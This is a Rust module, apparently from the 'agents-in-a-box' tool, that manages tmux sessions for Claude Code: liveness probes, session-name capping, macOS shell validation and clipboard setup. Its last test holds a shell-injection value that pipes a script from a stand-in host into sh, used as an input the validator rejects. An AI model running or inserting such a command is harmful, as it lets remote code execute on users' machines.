// ABOUTME: Tmux session management module for agents-in-a-box
//
// This module provides tmux-based session management as an alternative to
// Docker containers, enabling:
// - Native tmux sessions for Claude Code interactions
// - Live preview of session output in TUI
// - Seamless attach/detach with Ctrl+Q
// - Scroll mode for reviewing session history
// - Lightweight, fast, and responsive interactions

pub mod capture;
pub mod paste;
pub mod process_detection;
pub mod session;

use anyhow::Result;
use tokio::process::Command;
use tracing::debug;

/// Whether a tmux session with EXACTLY this name exists.
///
/// `Some(true)` / `Some(false)` are proven answers. `None` means the question
/// could not be answered: tmux missing from PATH (a launchd-spawned process
/// gets a minimal one), a wedged server, or a fork that failed under load.
/// Callers must not read `None` as "dead": a liveness check that turns an
/// environment problem into a fault would report a healthy session as broken.
///
/// The `=` prefix is load-bearing. Bare `has-session -t foo` resolves by
/// prefix and fnmatch, so it exits 0 for `foo-fix` when `foo` itself is long
/// gone. Only `-t =foo` compares exactly.
///
/// Bounded: a wedged tmux server never returns, and every caller here sits on
/// a collector loop that must keep publishing.
#[must_use]
pub fn session_alive(session: &str) -> Option<bool> {
    let mut child = std::process::Command::new("tmux")
        .args(["has-session", "-t", &format!("={session}")])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .ok()?;
    let deadline = std::time::Instant::now() + SESSION_PROBE_TIMEOUT;
    loop {
        match child.try_wait() {
            Ok(Some(status)) => return Some(status.success()),
            Ok(None) if std::time::Instant::now() < deadline => {
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
            // Wedged or unreadable: kill the child so it cannot outlive the
            // probe, and report "unknown" rather than guessing.
            _ => {
                let _ = child.kill();
                let _ = child.wait();
                return None;
            }
        }
    }
}

/// How long [`session_alive`] waits before calling the answer unknown.
const SESSION_PROBE_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(2);

/// Sanitize a name into the tmux session name `ainb` actually spawns under.
///
/// This is the single source of truth shared by [`session::TmuxSession`] (the
/// real spawner) and any caller that must *target* a session it did not spawn
/// (status / teardown). Keeping one implementation means a name containing a
/// space, `.`, `/`, or `:` resolves to the same session everywhere, instead of
/// the spawner and the targeter disagreeing and operating on the wrong session.
///
/// Capped by [`cap_session_name`], so a long workspace or branch still mints a
/// name the session list shows.
#[must_use]
pub fn sanitize_session_name(name: &str) -> String {
    let base_name = name.strip_prefix("tmux_").unwrap_or(name);
    let cleaned = base_name
        .replace(' ', "_")
        .replace('.', "_")
        .replace('/', "_")
        .replace(':', "_");
    cap_session_name(format!("tmux_{cleaned}"))
}

/// Fit a minted tmux session name within
/// [`TmuxSessionName::MAX_BYTES`](crate::app::effect::TmuxSessionName::MAX_BYTES).
///
/// Discovery skips any session past the cap (#1096), so an uncapped long
/// workspace or branch name spawned a session the list then never showed
/// (#1122). Any name is accepted, whatever its prefix (`tmux_...`, `ssh-...`,
/// a resumed session). A name within the cap is returned unchanged. A longer
/// one keeps its TAIL, which is where the part that tells sessions apart lives
/// (the `-<id>` of `ainb run`, the branch of `tmux_<folder>_<branch>`, the port
/// of `ssh-<host>-<port>`), and replaces the head with `tmux_<hash>_`, a hash
/// of the whole name, so two long names that share a tail but differ earlier
/// still mint different sessions. The original prefix is not kept. Deterministic: the
/// spawner and every later targeter compute the same name.
#[must_use]
pub(crate) fn cap_session_name(name: String) -> String {
    use crate::app::effect::TmuxSessionName;
    if TmuxSessionName::within_cap(&name) {
        return name;
    }
    let head = format!("tmux_{:08x}_", fnv1a_32(name.as_bytes()));
    let mut tail_start = name.len() - (TmuxSessionName::MAX_BYTES - head.len());
    while !name.is_char_boundary(tail_start) {
        tail_start += 1;
    }
    format!("{head}{}", &name[tail_start..])
}

/// Whether `name` is one [`cap_session_name`] shortened: `tmux_`, eight hex
/// digits and `_`, at the cap. The cap cuts the tail on a character boundary,
/// so a capped name can fall up to three bytes short of it. Kept beside the
/// capper so the layout it produces is described in one place.
pub(crate) fn is_capped_name(name: &str) -> bool {
    use crate::app::effect::TmuxSessionName;
    let at_cap =
        (TmuxSessionName::MAX_BYTES - 3..=TmuxSessionName::MAX_BYTES).contains(&name.len());
    let hashed_head = name.strip_prefix("tmux_").is_some_and(|stripped| {
        let bytes = stripped.as_bytes();
        bytes.len() > 8 && bytes[..8].iter().all(u8::is_ascii_hexdigit) && bytes[8] == b'_'
    });
    at_cap && hashed_head
}

/// FNV-1a, 32 bits. A fixed algorithm rather than the std hasher, whose output
/// is not promised to stay the same across Rust releases: a session minted by
/// one build must be found by the next.
pub(crate) fn fnv1a_32(bytes: &[u8]) -> u32 {
    bytes.iter().fold(0x811c_9dc5_u32, |hash, byte| {
        (hash ^ u32::from(*byte)).wrapping_mul(0x0100_0193)
    })
}

/// Known valid shells that we allow for reattach-to-user-namespace.
/// This prevents shell injection attacks via malicious $SHELL values.
const VALID_SHELLS: &[&str] = &[
    "/bin/bash",
    "/bin/zsh",
    "/bin/sh",
    "/bin/fish",
    "/bin/tcsh",
    "/bin/csh",
    "/bin/dash",
    "/bin/ksh",
    "/usr/bin/bash",
    "/usr/bin/zsh",
    "/usr/bin/sh",
    "/usr/bin/fish",
    "/usr/local/bin/bash",
    "/usr/local/bin/zsh",
    "/usr/local/bin/fish",
    "/opt/homebrew/bin/bash",
    "/opt/homebrew/bin/zsh",
    "/opt/homebrew/bin/fish",
];

/// Check if reattach-to-user-namespace is available (macOS only).
/// This tool restores access to the macOS user namespace (audio, clipboard, etc.) in tmux.
///
/// Uses direct execution test rather than `which` for reliability.
#[cfg(target_os = "macos")]
pub async fn has_reattach_to_user_namespace() -> bool {
    // Try to run the command with a simple echo - this verifies it actually works
    Command::new("reattach-to-user-namespace")
        .args(["echo", "test"])
        .output()
        .await
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Non-macOS: reattach-to-user-namespace is not needed.
#[cfg(not(target_os = "macos"))]
pub async fn has_reattach_to_user_namespace() -> bool {
    false
}

/// Get a validated shell path for use with reattach-to-user-namespace.
/// Returns None if $SHELL is not in the allowed list (security measure).
#[cfg(target_os = "macos")]
fn get_validated_shell() -> Option<String> {
    let shell = std::env::var("SHELL").ok()?;

    // Check if the shell is in our allowed list
    if VALID_SHELLS.contains(&shell.as_str()) {
        return Some(shell);
    }

    // Also allow if it ends with a known shell name and exists
    let shell_name = std::path::Path::new(&shell).file_name().and_then(|n| n.to_str())?;

    if ["bash", "zsh", "sh", "fish", "tcsh", "csh", "dash", "ksh"].contains(&shell_name) {
        // Verify the path exists and is executable
        if std::path::Path::new(&shell).exists() {
            return Some(shell);
        }
    }

    tracing::warn!(
        "Shell '{}' not in allowed list, falling back to /bin/zsh",
        shell
    );
    Some("/bin/zsh".to_string())
}

/// Configure a tmux session to use reattach-to-user-namespace on macOS.
/// This enables audio (say command), clipboard (pbcopy/pbpaste), and other
/// user namespace features within tmux sessions.
///
/// # Arguments
/// * `session_name` - The tmux session name to configure
///
/// # Returns
/// * `Ok(true)` - Configuration was applied successfully
/// * `Ok(false)` - reattach-to-user-namespace not available (graceful degradation)
/// * `Err(_)` - Failed to apply configuration
#[cfg(target_os = "macos")]
pub async fn configure_macos_user_namespace(session_name: &str) -> anyhow::Result<bool> {
    // Check if the tool is available
    if !has_reattach_to_user_namespace().await {
        tracing::debug!(
            "reattach-to-user-namespace not installed, skipping macOS user namespace config for session: {}",
            session_name
        );
        return Ok(false);
    }

    // Get validated shell (prevents injection attacks)
    let shell = match get_validated_shell() {
        Some(s) => s,
        None => {
            tracing::warn!(
                "Could not determine valid shell, skipping user namespace config for session: {}",
                session_name
            );
            return Ok(false);
        }
    };

    let default_cmd = format!("reattach-to-user-namespace -l {}", shell);

    // Apply the configuration
    let output = Command::new("tmux")
        .args([
            "set-option",
            "-t",
            session_name,
            "default-command",
            &default_cmd,
        ])
        .output()
        .await?;

    if output.status.success() {
        tracing::info!(
            "Configured reattach-to-user-namespace for session: {} (shell: {})",
            session_name,
            shell
        );
        Ok(true)
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        tracing::warn!(
            "Failed to configure reattach-to-user-namespace for session {}: {}",
            session_name,
            stderr.trim()
        );
        // Return Ok(false) instead of error - graceful degradation
        Ok(false)
    }
}

/// Non-macOS: No-op for user namespace configuration.
#[cfg(not(target_os = "macos"))]
pub async fn configure_macos_user_namespace(_session_name: &str) -> anyhow::Result<bool> {
    Ok(false)
}

/// Configure clipboard integration for a tmux session
///
/// Enables OSC 52 clipboard support and platform-specific copy commands
/// so that copy/paste works with the system clipboard.
pub async fn configure_clipboard(session_name: &str) -> Result<()> {
    debug!("Configuring clipboard for tmux session: {}", session_name);

    // Enable set-clipboard for OSC 52 escape sequence support
    // This allows the terminal to access the system clipboard
    let output = Command::new("tmux")
        .args(["set-option", "-t", session_name, "set-clipboard", "on"])
        .output()
        .await?;

    if !output.status.success() {
        anyhow::bail!(
            "Failed to set tmux option set-clipboard: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    // Configure copy-pipe for mouse selection to use system clipboard
    #[cfg(target_os = "macos")]
    {
        bind_clipboard_for_copy_modes(session_name, "pbcopy").await?;
        debug!("Configured macOS clipboard with pbcopy");
    }

    #[cfg(target_os = "linux")]
    {
        // Linux: Try xclip first, then xsel
        let copy_cmd = if which::which("xclip").is_ok() {
            Some("xclip -selection clipboard")
        } else if which::which("xsel").is_ok() {
            Some("xsel --clipboard --input")
        } else {
            None
        };

        if let Some(cmd) = copy_cmd {
            bind_clipboard_for_copy_modes(session_name, cmd).await?;
            debug!("Configured Linux clipboard with: {}", cmd);
        } else {
            debug!("No clipboard tool found on Linux (xclip or xsel)");
        }
    }

    Ok(())
}

/// Bind clipboard copy command for both copy-mode and copy-mode-vi
/// Note: tmux key bindings are global, not session-specific
#[cfg(any(target_os = "macos", target_os = "linux"))]
async fn bind_clipboard_for_copy_modes(_session_name: &str, copy_cmd: &str) -> Result<()> {
    // Bind for both emacs-style (copy-mode) and vi-style (copy-mode-vi) modes
    for mode in ["copy-mode-vi", "copy-mode"] {
        let output = Command::new("tmux")
            .args([
                "bind-key",
                "-T",
                mode,
                "MouseDragEnd1Pane",
                "send-keys",
                "-X",
                "copy-pipe-and-cancel",
                copy_cmd,
            ])
            .output()
            .await?;

        if !output.status.success() {
            anyhow::bail!(
                "Failed to bind tmux key for {}: {}",
                mode,
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    Ok(())
}

#[allow(unused_imports)]
// lib-facing re-export; the bin target includes this module tree directly
pub use capture::CaptureOptions;
#[allow(unused_imports)]
// lib-facing re-export; the bin target includes this module tree directly
pub use process_detection::ClaudeProcessDetector;
#[allow(unused_imports)]
// lib-facing re-export; the bin target includes this module tree directly
#[allow(unused_imports)]
// lib-facing re-export; the bin target includes this module tree directly
pub use session::{AttachState, TmuxSession};

#[cfg(test)]
mod tests {
    use super::*;

    /// #1122: an `ainb run` session for a very long workspace name mints a name
    /// the session list keeps, and it still ends in the id that makes it unique.
    #[test]
    fn an_over_long_workspace_name_mints_a_listed_session() {
        use crate::app::effect::TmuxSessionName;
        let workspace = "a-workspace-whose-folder-name-goes-on-".repeat(8);
        let minted = sanitize_session_name(&format!("{workspace}-0a1b2c3d"));
        assert!(
            TmuxSessionName::within_cap(&minted),
            "{} bytes is past the cap the list applies",
            minted.len()
        );
        assert!(
            TmuxSessionName::new(minted.clone()).is_some(),
            "{minted:?} is a name the host can list and target"
        );
        assert!(minted.starts_with("tmux_"), "{minted}");
        assert!(
            minted.ends_with("-0a1b2c3d"),
            "the unique suffix survives: {minted}"
        );
        assert_eq!(
            minted,
            sanitize_session_name(&format!("{workspace}-0a1b2c3d")),
            "the spawner and a later targeter agree"
        );
        assert_ne!(
            minted,
            sanitize_session_name(&format!("b{workspace}-0a1b2c3d")),
            "names that differ only in their head stay distinct"
        );
        assert_eq!(
            sanitize_session_name("repo-0a1b2c3d"),
            "tmux_repo-0a1b2c3d",
            "a name within the cap is untouched"
        );
    }

    /// A multi-byte tail is cut on a character boundary. Four-byte characters
    /// put the first tail byte mid-character, so the boundary walk has to run:
    /// without it the slice panics.
    #[test]
    fn a_capped_name_cuts_on_a_character_boundary() {
        let name = format!("tmux_{}", "\u{1F600}".repeat(40));
        let head = "tmux_00000000_".len();
        let first_cut = name.len() - (crate::app::effect::TmuxSessionName::MAX_BYTES - head);
        assert!(!name.is_char_boundary(first_cut), "the walk is exercised");
        let minted = cap_session_name(name);
        assert!(minted.len() <= crate::app::effect::TmuxSessionName::MAX_BYTES);
        assert!(minted.ends_with('\u{1F600}'), "{minted}");
    }

    #[test]
    fn test_valid_shells_are_absolute_paths() {
        for shell in VALID_SHELLS {
            assert!(
                shell.starts_with('/'),
                "Shell {} should be an absolute path",
                shell
            );
        }
    }

    #[test]
    #[cfg(target_os = "macos")]
    fn test_get_validated_shell_rejects_injection() {
        // This test requires temporarily setting SHELL, which isn't safe in parallel tests
        // So we just verify the validation logic exists by checking the constant
        assert!(!VALID_SHELLS.contains(&"/bin/zsh; curl evil.com | sh"));
        assert!(!VALID_SHELLS.contains(&"$(whoami)"));
    }
}
